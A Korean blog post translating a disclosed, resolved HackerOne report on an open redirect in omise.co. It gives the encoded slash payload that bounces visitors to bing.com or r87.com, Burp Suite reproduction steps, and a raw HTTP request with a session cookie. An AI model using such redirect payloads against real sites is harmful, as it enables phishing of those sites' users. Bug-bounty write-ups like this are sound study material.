---
layout: post
title: Open Redirect
categories: PoC
tags: [Bugbounty, OpenRedirect, Translation, Hackerone]
---
출처 : [hackerone hacktivity, 작성자 : Jishnu Sudhakaran (jishnupunnol)] https://hackerone.com/reports/504751

_[ 본 이슈는 해결 된 상태이며, 취약점은 한국시각으로 2019년 3월 25일 오전 6시 42분에 공개되었습니다. Omise에 리포팅 되었습니다. 취약점의 종류는 Open Redirect이며, 포상금은 $100달러로 한화로 약 11만원 입니다. 해당 취약점은 해당 도메인에서 3.3/10 정도의 심각성을 내포하고 있습니다. ]_
- - -

# 설명
Open Redirect 취약점.

URL : https://www.omise.co////bing.com/?www.omise.co/?category=interview&page=2

파라미터 종류 : URL 재작성

공격 패턴 : %2f%2f%2fr87.com%2f%3fwww.omise.co%2f
- - -
# 공격이 발생되는 과정
1. 다음의 URL을 버프스위트를 이용해 가로챈 뒤 리피터 탭으로 보냅니다 : https://www.omise.co/?category=interview&page=2
1. 다음과 같은 공격 패턴을 이용합니다 : /%2f%2f%2fbing.com%2f%3fwww.omise.co
1. bing.com 으로 리다이렉트 시킵니다.


## Request body와 캡처 이미지는 다음과 같습니다 :
{% highlight html %}
GET /%2f%2f%2fbing.com%2f%3fwww.omise.co/?category=interview&page=2 HTTP/1.1
Host: www.omise.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _omise-website_session=OHdwcEpSZVUvVXRqS3F3bUVyUUhaZ2pVY00wVWJ1c042RWZZNHdOendwUEkzS0dnaTJPb1hub3ZxcGhkUk5FNy96blpiNjJPL0hhMUZBdS9Jb2ZFY25BcWxzcXNjbTAyclJLTlo0VGUvbzBsa085MXhNUG9uZFpzRnBBeEp4a2MtLU9ONHdIWVBZdWZlS3VIVXVYTVNkOVE9PQ%3D%3D--cf8f4d43247d9eb5aa162a3f00fabc02bbda3b34
Upgrade-Insecure-Requests: 1
{% endhighlight %}

![Omise.co_]({{site.baseurl}}/images/Omise.co_.png)
<center>POC 중 하나. 나머지 4개의 첨부 이미지도 같은 형식임.  
[사진 출처 : https://hackerone.com/reports/405342]</center>
- - -
# 영향
공격자는 해당 취약점을 이용하여 사용자를 피싱과 같은 다른 악의적인 웹 사이트로 리다이렉트 시킬 수 있습니다.